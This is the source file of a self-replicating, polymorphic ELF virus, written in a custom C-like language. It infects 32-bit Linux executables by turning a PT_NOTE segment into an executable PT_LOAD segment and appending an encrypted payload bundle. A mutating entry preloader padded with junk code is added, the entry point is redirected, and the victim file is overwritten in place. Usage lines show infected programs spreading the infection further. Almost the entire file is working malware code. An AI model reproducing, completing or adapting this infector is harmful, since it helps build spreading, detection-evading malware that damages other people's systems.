// infector_elf.mc — Minimal self-replicating ELF infector example
//
// Demonstrates polymorphic self-replication via PT_NOTE→PT_LOAD injection.
// Appends payload (syscall wrappers + PIC code + data + bundles + API table + preloader)
// at end of file, converts a PT_NOTE program header to PT_LOAD.
// Uses PIC mode — position-independent code with API table pointing to syscall wrappers.
// No LDE, no disassembly, no code scattering, no fixup patching.
// Self-replicating: carries own .mcb + genome, mutates each generation.
//
// Usage (under Linux/WSL):
//   ./infector_elf --infect victim
//   ./victim --infect another       (self-replication)

#include "../../compiler/backend/backend_mystc.mc"
#include "infector_common.mc"

// =============================================================================
// File Layout
// =============================================================================
//   1. ELF Constants
//   2. ELF Helpers (validate, PT_NOTE finder, VA scanner)
//   3. Extern Fallback Stub
//   4. Infect (PT_NOTE → PT_LOAD append)
//
// run_infect() and main() live in infector_common.mc (shared with PE).
// =============================================================================

// =============================================================================
//
// ELF Constants Module
//
// =============================================================================

int ELF_EHDR_SZ   = 52;
int ELF_PHDR_SZ   = 32;

// Ehdr field offsets
int E_ENTRY_OFF    = 24;
int E_PHOFF_OFF    = 28;
int E_PHNUM_OFF    = 44;

// Phdr field offsets
int P_TYPE_OFF     = 0;
int P_OFFSET_OFF   = 4;
int P_VADDR_OFF    = 8;
int P_PADDR_OFF    = 12;
int P_FILESZ_OFF   = 16;
int P_MEMSZ_OFF    = 20;
int P_FLAGS_OFF    = 24;
int P_ALIGN_OFF    = 28;

int PT_LOAD        = 1;
int PT_NOTE        = 4;
int PF_R           = 4;
int PF_W           = 2;
int PF_X           = 1;
int ELF_PAGE       = 0x1000;

// =============================================================================
//
// ELF Helpers Module
//
// validate_elf, find_pt_note (locates the convertible note segment),
// find_highest_va (where the appended payload will live).
//
// =============================================================================

int validate_elf(char* data, int size) {
    if (size < 128) { return 0; }
    // \x7fELF magic
    if ((data[0] & 0xFF) != 0x7F) { return 0; }
    if ((data[1] & 0xFF) != 0x45) { return 0; }   // 'E'
    if ((data[2] & 0xFF) != 0x4C) { return 0; }   // 'L'
    if ((data[3] & 0xFF) != 0x46) { return 0; }   // 'F'
    if ((data[4] & 0xFF) != 1) { return 0; }      // ELFCLASS32
    if ((data[5] & 0xFF) != 1) { return 0; }      // ELFDATA2LSB
    if (read_i16(data, 18) != 3) { return 0; }    // EM_386
    if (read_i16(data, 16) != 2) { return 0; }    // ET_EXEC
    return 1;
}

// Find first PT_NOTE program header. Returns file offset or -1.
int find_pt_note(char* data, int size) {
    int phoff; int phnum; int i; int ph;
    phoff = read_i32(data, E_PHOFF_OFF);
    phnum = read_i16(data, E_PHNUM_OFF);
    i = 0;
    while (i < phnum) {
        ph = phoff + i * ELF_PHDR_SZ;
        if (ph + ELF_PHDR_SZ > size) { return -1; }
        if (read_i32(data, ph + P_TYPE_OFF) == PT_NOTE) { return ph; }
        i = i + 1;
    }
    return -1;
}

// Find highest VA end among PT_LOAD segments.
int find_highest_va(char* data, int size) {
    int phoff; int phnum; int i; int ph;
    int vaddr; int memsz; int highest;
    phoff = read_i32(data, E_PHOFF_OFF);
    phnum = read_i16(data, E_PHNUM_OFF);
    highest = 0;
    i = 0;
    while (i < phnum) {
        ph = phoff + i * ELF_PHDR_SZ;
        if (read_i32(data, ph + P_TYPE_OFF) == PT_LOAD) {
            vaddr = read_i32(data, ph + P_VADDR_OFF);
            memsz = read_i32(data, ph + P_MEMSZ_OFF);
            if (vaddr + memsz > highest) { highest = vaddr + memsz; }
        }
        i = i + 1;
    }
    return highest;
}

// =============================================================================
//
// Extern Fallback Stub Module
//
// =============================================================================
// The compiled payload talks to the kernel directly via __syscall, so the API
// table doesn't point at hand-rolled syscall wrappers. Any extern slot still
// declared in extern_info (e.g. unused harmless 0-arg APIs) is wired to this
// 6-byte stub so an accidental call gracefully returns -1 instead of jumping
// into nowhere.

int build_extern_fallback(char* b, int o) {
    int start;
    start = o;
    o = poly_load_imm(b, o, 0, -1);     // MOV EAX, -1 (polymorphic; max 11 bytes)
    b[o] = 0xC3; o = o + 1;             // RET
    return o - start;
}

// =============================================================================
//
// Infect Module
//
// PT_NOTE → PT_LOAD conversion with payload appended at end of file.
//
// =============================================================================
//
// PIC mode: position-independent code, data at EBX+code_sz, API table at code[2].
// No fixup tables — externs resolved via API table pointing to syscall wrappers.
// Entry function receives API table ptr as first parameter.
//
// New segment layout:
//   [wrappers] [PIC code] [PIC data] [bundles] [API table] [entry preloader]

int infect_elf(char* victim_path, char* compiled, int compiled_sz,
               char* bundle_buf, int bundle_sz,
               int mcb_sz, int pay_sz, int gen_sz, int bundle_key) {
    char* elf; int elf_sz;
    int note_off;
    int entry_off; int code_sz; int data_sz;
    int extern_count; int ext_info_sz;
    char* code_ptr; char* data_ptr; char* ext_info;
    char wrapper_buf[16];
    int wrapper_sz;
    int new_va; int code_off; int data_off; int bundle_off;
    int api_off; int preloader_off; int total;
    char* out; int out_sz;
    int header_align_pad; int header_n_desc; int header_total; int header_off;

    // ---- 1. Read victim ELF ----
    elf_sz = 0;
    elf = read_file(victim_path, &elf_sz);
    if (elf == 0) {
        print("ERR: cannot read "); print(victim_path); print("\n");
        return 1;
    }
    if (validate_elf(elf, elf_sz) == 0) {
        print("ERR: not a valid ELF32 i386 executable\n");
        free(elf); return 1;
    }

    // ---- 2. Check infection marker (no PT_NOTE = already infected) ----
    note_off = find_pt_note(elf, elf_sz);
    if (note_off < 0) {
        print("SKIP: already infected (no PT_NOTE)\n");
        free(elf); return 0;
    }

    print("Victim: "); print(victim_path);
    print(" ("); print_int(elf_sz); print(" bytes)\n");

    // ---- 3. Parse PIC output: PIC_HEADER_SIZE-byte header + code + data + extern_info ----
    entry_off    = read_i32(compiled, 0);
    code_sz      = read_i32(compiled, 4);
    data_sz      = read_i32(compiled, 8);
    extern_count = read_i32(compiled, 12);
    ext_info_sz  = read_i32(compiled, 16);
    code_ptr = compiled + PIC_HEADER_SIZE;
    data_ptr = compiled + PIC_HEADER_SIZE + code_sz;
    ext_info = compiled + PIC_HEADER_SIZE + code_sz + data_sz;

    print("  code="); print_int(code_sz);
    print(" data="); print_int(data_sz);
    print(" ext="); print_int(extern_count); print("\n");

    // ---- 4. Build extern fallback stub (one shared "return -1" thunk) ----
    mem_set(wrapper_buf, 0, 16);
    wrapper_sz = build_extern_fallback(wrapper_buf, 0);

    // ---- 5. Compute new segment layout ----
    // Code+data must be contiguous (PIC uses EBX-relative data access).
    // Reserve room for BundleHeader + descriptors between the encrypted
    // bundle bytes and the API table. 4-aligned so int loads in bundle_open /
    // bundle_get hit aligned addresses.
    new_va = align_up(find_highest_va(elf, elf_sz), ELF_PAGE);
    code_off = wrapper_sz;
    data_off = code_off + code_sz;
    bundle_off = data_off + data_sz;
    header_align_pad = (4 - ((bundle_off + bundle_sz) & 3)) & 3;
    header_n_desc = 1;                                                       // BC_CARRIER
    if (pay_sz > 0) { header_n_desc = header_n_desc + 1; }                    // BC_PAYLOAD
    header_n_desc = header_n_desc + 1;                                       // BC_GENOME
    header_total = 32 + header_n_desc * 16;
    header_off = bundle_off + bundle_sz + header_align_pad;
    api_off = header_off + header_total;
    preloader_off = api_off + extern_count * 4;
    // Preloader worst case:
    //   4 poly_junk slots × up to 6 ops × 6 bytes (LEA pair) = 144
    //   + save/restore/entry_call/oep_xfer up to 7 each       =  28
    //   + PUSH api_va (5) + ADD ESP,4 (3)                     =   8
    //   ≈ 180 bytes. Round to 256 for margin.
    total = preloader_off + 256;

    // ---- 6. Write API table VA to PIC code[2] (before copy to output) ----
    write_i32(code_ptr, 2, new_va + api_off);

    // ---- 7. Build output ----
    {
        int pf; int s; int off; int preloader_va; int disp; int oep;
        pf = align_up(elf_sz, ELF_PAGE);
        out_sz = pf + total;
        out = malloc(out_sz);
        mem_set(out, 0, out_sz);
        mem_copy(out, elf, elf_sz);
        mem_copy(out + pf, wrapper_buf, wrapper_sz);
        mem_copy(out + pf + code_off, code_ptr, code_sz);
        if (data_sz > 0) {
            mem_copy(out + pf + data_off, data_ptr, data_sz);
        }
        mem_copy(out + pf + bundle_off, bundle_buf, bundle_sz);

        // Emit BundleHeader + descriptors after the encrypted bundle bytes.
        // base_addr points at the bundle (XOR'd) and `key` is the XOR key so
        // bundle_open() decrypts in place on first call.
        {
            int hp_foff; int header_va; int hdi; int hboff;
            hp_foff = pf + header_off;
            header_va = new_va + header_off;
            write_i32(out, hp_foff +  0, META_MAGIC);
            write_i32(out, hp_foff +  4, META_VERSION);
            write_i32(out, hp_foff +  8, header_total);
            write_i32(out, hp_foff + 12, header_n_desc);
            write_i32(out, hp_foff + 16, new_va + bundle_off);
            write_i32(out, hp_foff + 20, bundle_sz);
            write_i32(out, hp_foff + 24, bundle_key);
            write_i32(out, hp_foff + 28, 0);
            hdi = 0;
            hboff = 0;
            write_i32(out, hp_foff + 32 + hdi*16 +  0, BC_CARRIER);
            write_i32(out, hp_foff + 32 + hdi*16 +  4, hboff);
            write_i32(out, hp_foff + 32 + hdi*16 +  8, mcb_sz);
            write_i32(out, hp_foff + 32 + hdi*16 + 12, 1);
            hdi = hdi + 1; hboff = hboff + mcb_sz;
            if (pay_sz > 0) {
                write_i32(out, hp_foff + 32 + hdi*16 +  0, BC_PAYLOAD);
                write_i32(out, hp_foff + 32 + hdi*16 +  4, hboff);
                write_i32(out, hp_foff + 32 + hdi*16 +  8, pay_sz);
                write_i32(out, hp_foff + 32 + hdi*16 + 12, 1);
                hdi = hdi + 1; hboff = hboff + pay_sz;
            }
            write_i32(out, hp_foff + 32 + hdi*16 +  0, BC_GENOME);
            write_i32(out, hp_foff + 32 + hdi*16 +  4, hboff);
            write_i32(out, hp_foff + 32 + hdi*16 +  8, gen_sz);
            write_i32(out, hp_foff + 32 + hdi*16 + 12, 1);

            // Patch g_bundle_header in the program's data section copy → header VA
            if (g_bundle_header_off >= 0) {
                write_i32(out, pf + data_off + g_bundle_header_off, header_va);
            }
        }

        // ---- 8. Build API table — every slot points at the fallback thunk ----
        {
            int ai;
            ai = 0;
            while (ai < extern_count) {
                write_i32(out, pf + api_off + ai * 4, new_va);
                ai = ai + 1;
            }
        }

        // ---- 9. Write polymorphic entry preloader ----
        // PIC entry function expects API table ptr as first parameter ([EBP+8]).
        // Skeleton: [junk] save_regs PUSH api_va [junk] entry_call ADD ESP,4 [junk] restore_regs [junk] oep_xfer
        // The PUSH api_va / ADD ESP,4 wrap is structural (cdecl arg pass);
        // save/restore + entry_call + oep_xfer are polymorphic.
        {
            int order[7]; int n_saved;
            int target_va;
            prng_seed(runtime_seed());
            s = pf + preloader_off;
            off = 0;
            preloader_va = new_va + preloader_off;
            oep = read_i32(elf, E_ENTRY_OFF);
            target_va = new_va + code_off + entry_off;

            off = poly_junk(out + s, off, -1);
            off = emit_save_regs(out + s, off, order, &n_saved);
            out[s + off] = 0x68; off = off + 1;  // PUSH imm32 (api_table_va)
            write_i32(out, s + off, new_va + api_off);
            off = off + 4;
            off = poly_junk(out + s, off, -1);
            off = emit_entry_call(out + s, off, target_va, preloader_va + off, 1);
            out[s + off] = 0x83; off = off + 1;  // ADD ESP, 4
            out[s + off] = 0xC4; off = off + 1;
            out[s + off] = 4; off = off + 1;
            off = poly_junk(out + s, off, -1);
            off = emit_restore_regs(out + s, off, order, n_saved);
            off = poly_junk(out + s, off, -1);
            off = emit_oep_transfer(out + s, off, oep, preloader_va + off, 1);
        }

        // ---- 10. Convert PT_NOTE → PT_LOAD ----
        write_i32(out, note_off + P_TYPE_OFF, PT_LOAD);
        write_i32(out, note_off + P_OFFSET_OFF, pf);
        write_i32(out, note_off + P_VADDR_OFF, new_va);
        write_i32(out, note_off + P_PADDR_OFF, new_va);
        write_i32(out, note_off + P_FILESZ_OFF, total);
        write_i32(out, note_off + P_MEMSZ_OFF, total);
        write_i32(out, note_off + P_FLAGS_OFF, PF_R | PF_W | PF_X);
        write_i32(out, note_off + P_ALIGN_OFF, ELF_PAGE);

        // ---- 11. Redirect entry point ----
        write_i32(out, E_ENTRY_OFF, new_va + preloader_off);
    }

    // ---- 12. Write output ----
    write_file(victim_path, out, out_sz);

    print("Infected: "); print(victim_path);
    print(" (+"); print_int(total); print(" bytes @ VA 0x");
    print_hex(new_va); print(")\n");

    free(elf); free(out);
    return 0;
}

